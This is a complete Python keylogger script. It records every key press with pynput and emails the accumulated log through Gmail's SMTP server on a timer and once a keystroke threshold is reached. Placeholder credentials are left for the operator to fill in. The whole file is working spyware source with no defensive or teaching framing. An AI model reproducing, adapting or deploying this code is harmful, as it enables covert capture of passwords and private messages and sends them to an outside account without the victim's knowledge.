import smtplib
import threading
from pynput import keyboard

class KeyLogger:
    def __init__(self, time_interval: int, email: str, password: str, keystroke_threshold: int = 20):
        """
        Initializes the KeyLogger class.
        
        :param time_interval: Interval (seconds) to send logged keystrokes via email.
        :param email: The email address to send logs to.
        :param password: The email account's password.
        :param keystroke_threshold: Minimum keystrokes before sending an email.
        """
        self.interval = time_interval
        self.log = "KeyLogger has started...\n"
        self.email = email
        self.password = password
        self.keystroke_threshold = keystroke_threshold
        self.keystrokes_count = 0  # Track number of keystrokes

    def append_to_log(self, string: str):
        """ Appends keystroke data to the log. """
        self.log += string
        self.keystrokes_count += 1

        # If the threshold is met, send an email immediately
        if self.keystrokes_count >= self.keystroke_threshold:
            self.report_n_send()

    def on_press(self, key):
        """ Handles key press events. """
        try:
            current_key = key.char  # Capture normal keys
        except AttributeError:
            if key == key.space:
                current_key = " "  # Space key
            elif key == key.esc:
                print("[!] Stopping Keylogger...")
                return False  # Stops listener when ESC is pressed
            else:
                current_key = f" [{str(key)}] "  # Special keys

        print(f"[KEY PRESSED]: {current_key}")  # Debugging print
        self.append_to_log(current_key)

    def send_mail(self):
        """ Sends an email with the logged keystrokes. """
        try:
            if not self.log.strip():
                print("[⚠] No data to send. Skipping email.")
                return

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, f"Subject: Keylogger Report\n\n{self.log}")
            server.quit()
            print("[📧] Email sent successfully.")

            # Reset log after sending
            self.log = ""
            self.keystrokes_count = 0  # Reset keystroke count
        except Exception as e:
            print(f"[❌] Email sending failed: {e}")

    def report_n_send(self):
        """ Sends the keystroke log via email at regular intervals. """
        print(f"[🔄] Checking keystrokes: {self.keystrokes_count}")
        if self.keystrokes_count >= self.keystroke_threshold:
            self.send_mail()
        else:
            print("[⚠] Not enough keystrokes logged yet...")

        # Schedule next execution
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    def start(self):
        """ Starts the keylogger and listens for keystrokes. """
        print("[✅] Keylogger started...\n[🎧] Listener is active...")
        with keyboard.Listener(on_press=self.on_press) as listener:
            self.report_n_send()
            listener.join()

# Initialize and start keylogger
if __name__ == "__main__":
    keylogger = KeyLogger(
        time_interval=30, 
        email="your_email@gmail.com",  # Replace with your email
        password="your_password",  # Replace with your app password
        keystroke_threshold=100  # Adjust keystroke limit before sending
    )
    
    keylogger.start()
